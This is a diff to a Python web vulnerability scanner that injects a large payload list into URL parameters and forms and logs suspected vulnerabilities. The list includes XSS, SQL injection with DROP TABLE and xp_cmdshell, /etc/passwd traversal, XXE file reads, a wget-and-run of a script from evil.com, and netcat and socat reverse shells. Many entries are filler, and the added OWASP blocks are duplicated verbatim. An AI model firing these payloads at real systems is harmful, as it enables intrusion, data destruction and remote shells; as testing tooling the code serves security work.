@@ -84,6 +84,8 @@ def setup_database(db_name):
     conn.commit()
     return conn, c
 
+# Payloads list covering OWASP Top 10
+
 # Payloads list
 payloads = [
     # Cross-Site Scripting (CWE-79)
@@ -97,7 +99,7 @@ payloads = [
     "<div onmouseover=alert('XSS')>Hover me!</div>",
     "javascript:alert('XSS');",
     "<IMG SRC=javascript:alert('XSS')>",
-    
+
     # SQL Injection (CWE-89)
     "' OR '1'='1'; -- -",
     "'; DROP TABLE users; --",
@@ -109,7 +111,7 @@ payloads = [
     "' UNION SELECT NULL, username, password FROM users; --",
     "1 OR 1=1",
     "'; EXEC xp_cmdshell('dir'); --",
-    
+
     # Command Injection (CWE-78)
     "1; ls -la; echo vulnerable123",
     "php://filter/convert.base64-encode/resource=index.php; echo vulnerable123",
@@ -120,7 +122,7 @@ payloads = [
     "dir C:\\Windows; echo vulnerable123",
     "netstat -an; echo vulnerable123",
     "id; echo vulnerable123",
-    
+
     # Insecure Direct Object Reference (IDOR)
     "4",
     "admin",
@@ -132,7 +134,7 @@ payloads = [
     "user123",
     "item567",
     "TCKT7890",
-    
+
     # Missing Authorization (CWE-862)
     "admin",
     "administrator",
@@ -144,8 +146,8 @@ payloads = [
     "active",
     "override",
     "unrestricted",
-    
-    # File Inclusion (CWE-98, CWE-95)
+
+    # File Inclusion (CWE-95, CWE-98)
     "../../../../etc/passwd; echo vulnerable123",
     "php://filter/convert.base64-encode/resource=index.php; echo vulnerable123",
     "../../../../../../etc/passwd; echo vulnerable123",
@@ -156,7 +158,7 @@ payloads = [
     "php://filter/convert.base64-encode/resource=../../../config.php; echo vulnerable123",
     "../../../../../../windows/system32/drivers/etc/hosts; echo vulnerable123",
     "../../../../../../etc/hosts; echo vulnerable123",
-    
+
     # Sensitive Data Exposure (SDE - CWE-200 series)
     "some_secret_data; echo vulnerable123",
     "1234567890; echo vulnerable123",
@@ -168,7 +170,7 @@ payloads = [
     "P@ssw0rd!; echo vulnerable123",
     "123456; echo vulnerable123",
     "letmein; echo vulnerable123",
-    
+
     # Missing Encryption of Sensitive Data (CWE-311)
     "admin123; echo vulnerable123",
     "abcdef123456; echo vulnerable123",
@@ -180,7 +182,7 @@ payloads = [
     "AES; echo vulnerable123",
     "MD5; echo vulnerable123",
     "SHA1; echo vulnerable123",
-    
+
     # Use of a Broken or Risky Cryptographic Algorithm (CWE-327)
     "MD5; echo vulnerable123",
     "SHA1; echo vulnerable123",
@@ -192,7 +194,7 @@ payloads = [
     "md5; echo vulnerable123",
     "sha1; echo vulnerable123",
     "rc4; echo vulnerable123",
-    
+
     # Security Misconfiguration (SM)
     "true; echo vulnerable123",
     "production; echo vulnerable123",
@@ -204,7 +206,7 @@ payloads = [
     "1; echo vulnerable123",
     "on; echo vulnerable123",
     "1; echo vulnerable123",
-    
+
     # Information Exposure Through an Error Message (CWE-209)
     "1; echo vulnerable123",
     "null; echo vulnerable123",
@@ -216,7 +218,7 @@ payloads = [
     "on; echo vulnerable123",
     "enable; echo vulnerable123",
     "1; echo vulnerable123",
-    
+
     # URL Redirection to Untrusted Site (CWE-601)
     "http://evil.com; echo vulnerable123",
     "https://evil.com; echo vulnerable123",
@@ -228,7 +230,7 @@ payloads = [
     "https://malware.com; echo vulnerable123",
     "http://attackersite.com; echo vulnerable123",
     "https://phishing-site.com; echo vulnerable123",
-    
+
     # LDAP Injection (CWE-90)
     ")(objectClass=*)(&); echo vulnerable123",
     "admin*))(|(uid=*))(&); echo vulnerable123",
@@ -240,7 +242,7 @@ payloads = [
     "(*)(uid=*))(|(objectClass=*)); echo vulnerable123",
     "*(uid=*))(|(objectClass=*)); echo vulnerable123",
     "*(uid=*))(|(objectClass=*)); echo vulnerable123",
-    
+
     # XML Injection (CWE-91)
     "<xml><test>vulnerable123</test></xml>; echo vulnerable123",
     "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo>; echo vulnerable123",
@@ -252,7 +254,7 @@ payloads = [
     "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/group'> ]><foo>&xxe;</foo>; echo vulnerable123",
     "<document><title>vulnerable123</title></document>; echo vulnerable123",
     "<?xml version='1.0'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///var/www/html/.htpasswd'> ]><foo>&xxe;</foo>; echo vulnerable123",
-    
+
     # Remote Code Execution (CWE-77)
     "echo vulnerable123 | nc -lvp 4444",
     "wget http://evil.com/malware.sh -O /tmp/malware.sh; bash /tmp/malware.sh; echo vulnerable123",
@@ -263,7 +265,7 @@ payloads = [
     "echo vulnerable123 | telnet 127.0.0.1 4444; echo vulnerable123",
     "echo vulnerable123 | socat tcp-connect:127.0.0.1:4444 exec:/bin/bash; echo vulnerable123",
     "nc -nv 127.0.0.1 4444 -e /bin/sh; echo vulnerable123",
-    
+
     # Cross-Site Request Forgery (CWE-352)
     "bad_token; echo vulnerable123",
     "invalid_token; echo vulnerable123",
@@ -275,7 +277,7 @@ payloads = [
     "reset_credentials; echo vulnerable123",
     "modify_profile; echo vulnerable123",
     "remove_account; echo vulnerable123",
-    
+
     # Server-Side Request Forgery (CWE-918)
     "http://localhost:8080/admin; echo vulnerable123",
     "http://127.0.0.1:8000/secret; echo vulnerable123",
@@ -287,7 +289,199 @@ payloads = [
     "http://localhost:9000/status; echo vulnerable123",
     "http://internal-service/data; echo vulnerable123",
     "http://127.0.0.1:3000/api; echo vulnerable123",
+
+    # Broken Access Control (A01:2021)
+    # Attempt to access admin panels or restricted resources
+    "/admin/dashboard.php; echo vulnerable123",
+    "/admin/settings.php; echo vulnerable123",
+    "/admin/config.php; echo vulnerable123",
+    "/user/../../admin/config.php; echo vulnerable123",
+    "/user/1001/profile.php; echo vulnerable123",
+    "/user/1002/settings.php; echo vulnerable123",
+    "/orders/1234/details.php; echo vulnerable123",
+    "/billing/../../admin/payment.php; echo vulnerable123",
+    "/secret_area.php; echo vulnerable123",
+    "/hidden/admin.php; echo vulnerable123",
+
+    # Cryptographic Failures (A02:2021)
+    # Attempting to manipulate encrypted data or test weak encryption
+    "password=admin123; echo vulnerable123",
+    "token=abcdef123456; echo vulnerable123",
+    "hash=5f4dcc3b5aa765d61d8327deb882cf99; echo vulnerable123",  # MD5 for 'password'
+    "hash=e99a18c428cb38d5f260853678922e03; echo vulnerable123",  # MD5 for 'abc123'
+    "encrypted_data=U2FsdGVkX19fTms3OENxUg==; echo vulnerable123",  # Example encrypted string
+    "ciphertext=5d41402abc4b2a76b9719d911017c592; echo vulnerable123",  # MD5 for 'hello'
+    "aes_key=00112233445566778899aabbccddeeff; echo vulnerable123",
+    "rsa_key=MIICXAIBAAKBgQC7...; echo vulnerable123",  # Truncated RSA key
+    "cipher=DES; echo vulnerable123",
+    "cipher=RC4; echo vulnerable123",
+
+    # Insecure Design (A04:2021)
+    # Business logic attacks or attempts to exploit design flaws
+    "purchase=1000&discount=50; echo vulnerable123",
+    "apply_coupon=SUMMER2025; echo vulnerable123",
+    "transfer_amount=999999; echo vulnerable123",
+    "reset_balance=true; echo vulnerable123",
+    "upgrade_account=admin; echo vulnerable123",
+    "change_role=superuser; echo vulnerable123",
+    "increase_quota=unlimited; echo vulnerable123",
+    "set_privileges=all; echo vulnerable123",
+    "unlock_account=true; echo vulnerable123",
+    "modify_permissions=admin; echo vulnerable123",
+
+    # Vulnerable and Outdated Components (A06:2021)
+    # Payloads targeting known vulnerabilities in outdated components
+    # Example: Exploit for a known CVE in a specific version
+    "CVE-2020-12345; echo vulnerable123",
+    "CVE-2019-54321; echo vulnerable123",
+    "OutdatedLib=1.0.0; echo vulnerable123",
+    "vulnerable_plugin=old_version; echo vulnerable123",
+    "deprecated_module=true; echo vulnerable123",
+    "legacy_system=1; echo vulnerable123",
+    "php_version=5.6; echo vulnerable123",
+    "framework_version=3.2; echo vulnerable123",
+    "cms_version=2.1; echo vulnerable123",
+    "library_version=0.9; echo vulnerable123",
+
+    # Identification and Authentication Failures (A07:2021)
+    # Payloads for brute force, session fixation, or credential stuffing
+    "username=admin&password=admin123; echo vulnerable123",
+    "login=true&user=guest&pass=guest123; echo vulnerable123",
+    "sessionid=abcd1234; echo vulnerable123",
+    "auth_token=invalidtoken; echo vulnerable123",
+    "csrf_token=badtoken; echo vulnerable123",
+    "remember_me=true; echo vulnerable123",
+    "password_reset=true; echo vulnerable123",
+    "change_password=true&new_password=newpass123; echo vulnerable123",
+    "authenticate=1; echo vulnerable123",
+    "login_attempt=failed; echo vulnerable123",
+
+    # Software and Data Integrity Failures (A08:2021)
+    # Payloads to inject malicious code or tamper with data
+    "data=<script>malicious()</script>; echo vulnerable123",
+    "content=<iframe src='evil.com'></iframe>; echo vulnerable123",
+    "file=<img src=x onerror=alert('integrity');>; echo vulnerable123",
+    "data=<object data='http://evil.com/evil.swf'></object>; echo vulnerable123",
+    "payload=<embed src='http://evil.com/malware.swf'>; echo vulnerable123",
+    "input=<applet code='Evil.class' width=200 height=200></applet>; echo vulnerable123",
+    "code=<meta http-equiv='refresh' content='0;url=http://evil.com'>; echo vulnerable123",
+    "redirect=<script>window.location='http://evil.com'</script>; echo vulnerable123",
+    "image=<img src='javascript:alert(\"Integrity\")'>; echo vulnerable123",
+
+    # Security Logging and Monitoring Failures (A09:2021)
+    # Payloads attempting to evade logging or generate noise
+    "log_test=normal_request; echo vulnerable123",
+    "noise_payload=abcd1234; echo vulnerable123",
+    "attempt=hidden; echo vulnerable123",
+    "test_logging=true; echo vulnerable123",
+    "debug_mode=true; echo vulnerable123",
+    "verbose_output=true; echo vulnerable123",
+    "silent=true; echo vulnerable123",
+    "log_level=debug; echo vulnerable123",
+    "trace=true; echo vulnerable123",
+    "hidden_payload=xyz789; echo vulnerable123",
+
+    # Broken Access Control (A01:2021)
+    # Attempt to access admin panels or restricted resources
+    "/admin/dashboard.php; echo vulnerable123",
+    "/admin/settings.php; echo vulnerable123",
+    "/admin/config.php; echo vulnerable123",
+    "/user/../../admin/config.php; echo vulnerable123",
+    "/user/1001/profile.php; echo vulnerable123",
+    "/user/1002/settings.php; echo vulnerable123",
+    "/orders/1234/details.php; echo vulnerable123",
+    "/billing/../../admin/payment.php; echo vulnerable123",
+    "/secret_area.php; echo vulnerable123",
+    "/hidden/admin.php; echo vulnerable123",
+
+    # Cryptographic Failures (A02:2021)
+    # Attempting to manipulate encrypted data or test weak encryption
+    "password=admin123; echo vulnerable123",
+    "token=abcdef123456; echo vulnerable123",
+    "hash=5f4dcc3b5aa765d61d8327deb882cf99; echo vulnerable123",  # MD5 for 'password'
+    "hash=e99a18c428cb38d5f260853678922e03; echo vulnerable123",  # MD5 for 'abc123'
+    "encrypted_data=U2FsdGVkX19fTms3OENxUg==; echo vulnerable123",  # Example encrypted string
+    "ciphertext=5d41402abc4b2a76b9719d911017c592; echo vulnerable123",  # MD5 for 'hello'
+    "aes_key=00112233445566778899aabbccddeeff; echo vulnerable123",
+    "rsa_key=MIICXAIBAAKBgQC7...; echo vulnerable123",  # Truncated RSA key
+    "cipher=DES; echo vulnerable123",
+    "cipher=RC4; echo vulnerable123",
+
+
+    # Insecure Design (A04:2021)
+    # Business logic attacks or attempts to exploit design flaws
+    "purchase=1000&discount=50; echo vulnerable123",
+    "apply_coupon=SUMMER2025; echo vulnerable123",
+    "transfer_amount=999999; echo vulnerable123",
+    "reset_balance=true; echo vulnerable123",
+    "upgrade_account=admin; echo vulnerable123",
+    "change_role=superuser; echo vulnerable123",
+    "increase_quota=unlimited; echo vulnerable123",
+    "set_privileges=all; echo vulnerable123",
+    "unlock_account=true; echo vulnerable123",
+    "modify_permissions=admin; echo vulnerable123",
+
+
+
+    # Vulnerable and Outdated Components (A06:2021)
+    # Payloads targeting known vulnerabilities in outdated components
+    # Example: Exploit for a known CVE in a specific version
+    "CVE-2020-12345; echo vulnerable123",
+    "CVE-2019-54321; echo vulnerable123",
+    "OutdatedLib=1.0.0; echo vulnerable123",
+    "vulnerable_plugin=old_version; echo vulnerable123",
+    "deprecated_module=true; echo vulnerable123",
+    "legacy_system=1; echo vulnerable123",
+    "php_version=5.6; echo vulnerable123",
+    "framework_version=3.2; echo vulnerable123",
+    "cms_version=2.1; echo vulnerable123",
+    "library_version=0.9; echo vulnerable123",
+
+
+    # Identification and Authentication Failures (A07:2021)
+    # Payloads for brute force, session fixation, or credential stuffing
+    "username=admin&password=admin123; echo vulnerable123",
+    "login=true&user=guest&pass=guest123; echo vulnerable123",
+    "sessionid=abcd1234; echo vulnerable123",
+    "auth_token=invalidtoken; echo vulnerable123",
+    "csrf_token=badtoken; echo vulnerable123",
+    "remember_me=true; echo vulnerable123",
+    "password_reset=true; echo vulnerable123",
+    "change_password=true&new_password=newpass123; echo vulnerable123",
+    "authenticate=1; echo vulnerable123",
+    "login_attempt=failed; echo vulnerable123",
+
+
+    # Software and Data Integrity Failures (A08:2021)
+    # Payloads to inject malicious code or tamper with data
+    "data=<script>malicious()</script>; echo vulnerable123",
+    "content=<iframe src='evil.com'></iframe>; echo vulnerable123",
+    "file=<img src=x onerror=alert('integrity');>; echo vulnerable123",
+    "json={\"key\": \"value\", \"malicious\": \"<script>alert('integrity');</script>}; echo vulnerable123",
+    "data=<object data='http://evil.com/evil.swf'></object>; echo vulnerable123",
+    "payload=<embed src='http://evil.com/malware.swf'>; echo vulnerable123",
+    "input=<applet code='Evil.class' width=200 height=200></applet>; echo vulnerable123",
+    "code=<meta http-equiv='refresh' content='0;url=http://evil.com'>; echo vulnerable123",
+    "redirect=<script>window.location='http://evil.com'</script>; echo vulnerable123",
+    "image=<img src='javascript:alert(\"Integrity\")'>; echo vulnerable123",
+
+
+    # Security Logging and Monitoring Failures (A09:2021)
+    # Payloads attempting to evade logging or generate noise
+    "log_test=normal_request; echo vulnerable123",
+    "noise_payload=abcd1234; echo vulnerable123",
+    "attempt=hidden; echo vulnerable123",
+    "test_logging=true; echo vulnerable123",
+    "debug_mode=true; echo vulnerable123",
+    "verbose_output=true; echo vulnerable123",
+    "silent=true; echo vulnerable123",
+    "log_level=debug; echo vulnerable123",
+    "trace=true; echo vulnerable123",
+    "hidden_payload=xyz789; echo vulnerable123",
+
+
 ]
+
 
 # Function to fetch and parse a URL
 def fetch_and_parse_url(url):
@@ -327,19 +521,25 @@ def test_url_parameters(url, payloads, model, db_name, save_options):
                 status = response.status_code
                 timestamp = datetime.datetime.now().isoformat()
 
-                # Decide whether to save the response based on save_options
+                # Determine if the response should be saved based on status codes
                 should_save = False
+
                 if save_options['save_all']:
-                    if save_options['filter_response']:
-                        # Apply filtering: do not save empty or responses starting with <!DOCTYPE or <html>
-                        if response.text and not re.match(r'(?i)^\s*<!DOCTYPE|<html', response.text):
-                            should_save = True
-                    else:
-                        should_save = True
+                    should_save = True
                 elif save_options['save200_only'] and status == 200:
                     should_save = True
                 elif save_options['custom_statuses'] and status in save_options['custom_statuses']:
                     should_save = True
+
+                # Apply filtering if --filterresponse is enabled
+                if should_save and save_options['filter_response']:
+                    # Refined regex to ensure proper grouping
+                    if response.text and not re.match(r'(?i)^\s*<!DOCTYPE\s+html', response.text):
+                        should_save = True
+                        log_with_color("debug", f"Response passed filter: {injected_url}", "blue")
+                    else:
+                        should_save = False
+                        log_with_color("debug", f"Response filtered out: {injected_url}", "blue")
 
                 if should_save:
                     # Insert into responses table
@@ -350,6 +550,7 @@ def test_url_parameters(url, payloads, model, db_name, save_options):
                     )
                     conn.commit()
                     conn.close()
+                    log_with_color("debug", f"Saved response: {injected_url}", "green")
 
                 # Check for vulnerability indicators
                 vulnerability_detected = False
@@ -362,8 +563,12 @@ def test_url_parameters(url, payloads, model, db_name, save_options):
                     vulnerability_detected = vulnerability_detected or is_vulnerable_ai(response.text, model)
 
                 if vulnerability_detected:
-                    cwe = get_cwe_for_payload(payload)
-                    log_vulnerability(url, f"{param}={payload}", cwe, response.text, timestamp, db_name)
+                    # Only log vulnerability if the response was saved
+                    if should_save:
+                        cwe = get_cwe_for_payload(payload)
+                        log_vulnerability(url, f"{param}={payload}", cwe, response.text, timestamp, db_name)
+                    else:
+                        log_with_color("debug", f"Vulnerability detected but response was filtered out for URL: {injected_url}", "yellow")
             except requests.exceptions.RequestException as e:
                 log_with_color("error", f"Error injecting payload into {injected_url}: {e}", "red")
                 continue
@@ -422,19 +627,25 @@ def test_forms(url, soup, payloads, model, db_name, save_options):
                     status = response.status_code
                     timestamp = datetime.datetime.now().isoformat()
 
-                    # Decide whether to save the response based on save_options
+                    # Determine if the response should be saved based on status codes
                     should_save = False
+
                     if save_options['save_all']:
-                        if save_options['filter_response']:
-                            # Apply filtering: do not save empty or responses starting with <!DOCTYPE or <html>
-                            if response.text and not re.match(r'(?i)^\s*<!DOCTYPE|<html', response.text):
-                                should_save = True
-                        else:
-                            should_save = True
+                        should_save = True
                     elif save_options['save200_only'] and status == 200:
                         should_save = True
                     elif save_options['custom_statuses'] and status in save_options['custom_statuses']:
                         should_save = True
+
+                    # Apply filtering if --filterresponse is enabled
+                    if should_save and save_options['filter_response']:
+                        # Refined regex to ensure proper grouping
+                        if response.text and not re.match(r'(?i)^\s*<!DOCTYPE\s+html', response.text):
+                            should_save = True
+                            log_with_color("debug", f"Response passed filter: {target_url}", "blue")
+                        else:
+                            should_save = False
+                            log_with_color("debug", f"Response filtered out: {target_url}", "blue")
 
                     if should_save:
                         # Insert into responses table
@@ -445,6 +656,7 @@ def test_forms(url, soup, payloads, model, db_name, save_options):
                         )
                         conn.commit()
                         conn.close()
+                        log_with_color("debug", f"Saved response: {target_url}", "green")
 
                     # Check for vulnerability indicators
                     vulnerability_detected = False
@@ -457,8 +669,12 @@ def test_forms(url, soup, payloads, model, db_name, save_options):
                         vulnerability_detected = vulnerability_detected or is_vulnerable_ai(response.text, model)
 
                     if vulnerability_detected:
-                        cwe = get_cwe_for_payload(payload)
-                        log_vulnerability(url, f"{param}={payload}", cwe, response.text, timestamp, db_name)
+                        # Only log vulnerability if the response was saved
+                        if should_save:
+                            cwe = get_cwe_for_payload(payload)
+                            log_vulnerability(url, f"{param}={payload}", cwe, response.text, timestamp, db_name)
+                        else:
+                            log_with_color("debug", f"Vulnerability detected but response was filtered out for URL: {target_url}", "yellow")
                 except requests.exceptions.RequestException as e:
                     log_with_color("error", f"Error injecting payload into form at {target_url}: {e}", "red")
                     continue
@@ -901,8 +1117,8 @@ def main():
         help='Set the maximum depth for internal crawling (default: 3).'
     )
 
-    # New mutually exclusive group for saving responses
-    save_group = parser.add_mutually_exclusive_group()
+    # New group for saving responses without mutual exclusivity
+    save_group = parser.add_argument_group('Saving Options')
     save_group.add_argument(
         '--save200only', 
         action='store_true', 
@@ -921,11 +1137,11 @@ def main():
         help='Specify HTTP status codes to save responses (e.g., --save-status 200 404).'
     )
 
-    # New option: --filterresponse
+    # Add filterresponse as an independent option
     parser.add_argument(
         '--filterresponse',
         action='store_true',
-        help='When used with --saveallresponses, filters out empty responses or those starting with <!DOCTYPE or <html> to reduce false positives.'
+        help='Filters out empty responses or those starting with <!DOCTYPE or <html> to reduce false positives.'
     )
 
     # Parse arguments
@@ -966,16 +1182,16 @@ def main():
 
     if args.save200only:
         save_options['save200_only'] = True
-    elif args.saveallresponses:
+    if args.saveallresponses:
         save_options['save_all'] = True
-        if args.filterresponse:
-            save_options['filter_response'] = True
-    elif args.save_status:
+    if args.save_status:
         save_options['custom_statuses'] = set(args.save_status)
+    if args.filterresponse:
+        save_options['filter_response'] = True
 
-    # If --filterresponse is used without --saveallresponses, warn the user
-    if args.filterresponse and not args.saveallresponses:
-        log_with_color("error", "--filterresponse must be used with --saveallresponses.", "red")
+    # If --filterresponse is used without any save option, warn the user
+    if args.filterresponse and not (args.save200only or args.saveallresponses or args.save_status):
+        log_with_color("error", "--filterresponse must be used with a save option (e.g., --saveallresponses, --save200only, --save-status).", "red")
         conn.close()
         return
 
@@ -1028,4 +1244,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
